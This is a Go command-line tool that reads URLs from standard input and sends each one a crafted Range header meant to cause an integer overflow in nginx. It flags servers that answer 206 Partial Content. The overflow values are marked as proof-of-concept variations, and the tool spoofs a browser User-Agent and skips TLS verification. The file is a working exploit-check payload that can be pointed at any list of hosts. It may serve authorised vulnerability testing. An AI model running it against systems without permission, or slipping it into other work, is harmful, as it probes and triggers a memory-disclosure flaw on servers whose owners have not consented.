package main

import (
	"bufio"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/projectdiscovery/retryablehttp-go"
)

func main() {
	flag.Parse()

	cl := NewClient()

	sc := bufio.NewScanner(os.Stdin)
	for sc.Scan() {
		url := sc.Text()
		baseResp, err := cl.DoRequest(url, "")
		if err != nil {
			continue
		}
		res, err := cl.CheckVuln(baseResp)
		if err != nil {
			continue
		}
		fmt.Printf("%s\t%d,%d\n", res.url, res.rs, res.re)
	}
}

type Client struct {
	*retryablehttp.Client
}

func NewClient() *Client {
	var retryablehttpOptions = retryablehttp.DefaultOptionsSingle
	transport := &http.Transport{
		MaxIdleConnsPerHost: -1,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		DisableKeepAlives: true,
	}
	client := retryablehttp.NewWithHTTPClient(&http.Client{
		Transport:     transport,
		CheckRedirect: nil,
	}, retryablehttpOptions)

	return &Client{client}
}

func (cl *Client) DoRequest(u string, rh string) (resp *http.Response, err error) {
	req, err := retryablehttp.NewRequest("GET", u, nil)
	if err != nil {
		return
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15")
	if rh != "" {
		req.Header.Add("Range", rh)
	}

	resp, err = cl.Do(req)
	return
}

// CheckVuln injects HTTP request with an integer overflow Range header, and
// checks vulnerability based on a HTTP response that includes 206 Partial Content and Content-Range header
func (cl *Client) CheckVuln(r *http.Response) (Result, error) {
	cLen := int(r.ContentLength)
	rs, re := overflowRange(cLen)
	rangeHeader := fmt.Sprintf("bytes=%d,%d", rs, re)

	url := r.Request.URL.String()
	resp, err := cl.DoRequest(url, rangeHeader)
	if err != nil {
		return Result{}, errors.New("error in making vulnerable request")
	}

	if resp.StatusCode == 206 && checkContentRange(resp) && checkNginx(resp) {
		return Result{url, rs, re}, nil
	}
	return Result{}, errors.New("not vulnerable")
}

func checkNginx(r *http.Response) bool {
	server := r.Header.Get("Server")
	return strings.Contains(server, "nginx")
}

func checkContentRange(r *http.Response) bool {
	// check if Content-Range is in response header
	if r.Header.Get("Content-Range") != "" {
		return true
	} else if strings.Contains(r.Header.Get("Content-Type"), "multipart/byteranges") {
		// check if Content-Range is returned in response body
		rx := regexp.MustCompile(`(?i)content-range:\sbytes`)
		if rx.MatchReader(bufio.NewReader(r.Body)) {
			return true
		}
	}
	return false
}

func overflowRange(cLen int) (rs, re int) {
	// PoC variation 1
	// bytesLength := cLen + 623
	// rs = -bytesLength
	// re, _ = strconv.Atoi(fmt.Sprintf("-9223372036854%d", 776000 - bytesLength))

	// PoC variation 2
	n := cLen + 605
	t, _ := strconv.ParseInt("0x8000000000000000", 0, 64)
	rs, re = -n, -(int(t) - n)

	return
}

type Result struct {
	url    string
	rs, re int
}
